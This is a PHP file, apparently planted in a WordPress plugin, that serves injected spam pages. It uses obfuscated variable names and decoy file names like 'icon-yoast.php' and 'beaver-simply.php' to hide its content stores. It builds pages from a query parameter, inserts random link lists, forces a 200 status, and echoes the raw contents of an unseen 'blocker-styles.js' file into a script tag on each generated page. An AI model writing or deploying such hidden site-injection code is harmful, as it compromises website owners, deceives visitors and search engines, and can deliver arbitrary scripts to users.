<?php
$bnGDI0kM7 = intval(get_query_var('cgjfu'));

if ($bnGDI0kM7 < 1 || $bnGDI0kM7 > 2591) return;
$qbicyCxV2 = file(plugin_dir_path(__FILE__).'icon-yoast.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$aZrlvDLmKB = explode(';', $qbicyCxV2[$bnGDI0kM7]);
if (count($aZrlvDLmKB) < 2) return;
$jTlFN = $aZrlvDLmKB[0];
$unbbNvzb  = $aZrlvDLmKB[1];
$yXsGrqxAiX = $aZrlvDLmKB[2];
$l5mQd2pRg  = $aZrlvDLmKB[3];
$u4bFwvK = $aZrlvDLmKB[4];
set_query_var('rixyd', $jTlFN);

$rdVlSHp = '';
$ujxA8z = plugin_dir_path(__FILE__).'beaver-simply.php';
if (is_file($ujxA8z)) {
	$qfllNdlYr = file($ujxA8z, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($qfllNdlYr);
	shuffle($qfllNdlYr);
	$ow6KyC = mt_rand(2, 5);
	if (count($qfllNdlYr) > $ow6KyC) {
		for ($vEVgBC = 0; $vEVgBC < $ow6KyC; $vEVgBC++) {
			$rJOt2wgUhJ = array_shift($qfllNdlYr);
			$rdVlSHp .= '<p><a href="'.$rJOt2wgUhJ.'">'.$rJOt2wgUhJ.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $jTlFN; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $unbbNvzb . "</p>\n";
				if (strlen($l5mQd2pRg) > 0) echo "<p>" . $l5mQd2pRg . "</p>\n";
				if (strlen($yXsGrqxAiX) > 0) echo "<p>" . $yXsGrqxAiX . "</p>\n";
				if (strlen($u4bFwvK) > 0) echo '<p><a href="#"><img src="'.$u4bFwvK.'"></a>' . "</p>\n";
				echo $rdVlSHp;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$yqM87aE3pd = plugin_dir_path(__FILE__) . 'blocker-styles.js';
if (is_file($yqM87aE3pd)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($yqM87aE3pd);
	echo '</script>';
}
get_footer();
?>
